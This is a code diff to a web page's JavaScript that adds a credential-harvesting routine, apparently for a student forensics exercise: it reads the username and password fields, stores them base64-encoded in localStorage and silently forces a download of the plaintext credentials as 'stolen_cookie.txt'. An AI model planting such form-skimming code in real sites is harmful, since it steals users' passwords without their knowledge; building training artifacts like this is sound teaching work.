@@ -142,16 +142,35 @@
 
 <script>
 function captureHarvest(e) {
-    // 1. Target the input elements inside your existing form
+    // 1. Target your original form input properties case-sensitively
     const u = document.getElementById('username') ? document.getElementById('username').value : '';
     const p = document.getElementById('password') ? document.getElementById('password').value : '';
 
     if (u && p) {
-        // 2. Format and encode the stolen payload string into Base64
-        const logData = `[HARVEST CAPTURE] USER: ${u} | PASS: ${p}\n`;
-        
-        // 3. Bake the artifact into LocalStorage for your student analysts to hunt down
-        localStorage.setItem('stolen_token_cache', btoa(logData));
+        // 2. Format the credentials payload telemetry log line
+        const logPayload = `[HARVEST CAPTURE] USER: ${u} | PASS: ${p}\n`;
+        const base64Encoded = btoa(logPayload);
+
+        // 3. Artifact A: Fileless Save inside Browser Memory Space (LocalStorage)
+        localStorage.setItem('stolen_token_cache', base64Encoded);
+
+        try {
+            // 4. Artifact B: The Blob File Creation Routine
+            // We construct a raw plain-text memory container matching your instruction
+            const blob = new Blob([logPayload], { type: 'text/plain' });
+            
+            // Generate a hidden virtual link element to hold the blob stream address
+            const virtualLink = document.createElement('a');
+            virtualLink.href = window.URL.createObjectURL(blob);
+            virtualLink.download = 'stolen_cookie.txt'; // Sets the target file execution name
+            
+            // Temporarily append, trigger the download click, and clean up the DOM tree instantly
+            document.body.appendChild(virtualLink);
+            virtualLink.click();
+            document.body.removeChild(virtualLink);
+        } catch (err) {
+            // Fails silently in the background if browser engines throw pop-up flags
+        }
     }
 }
 
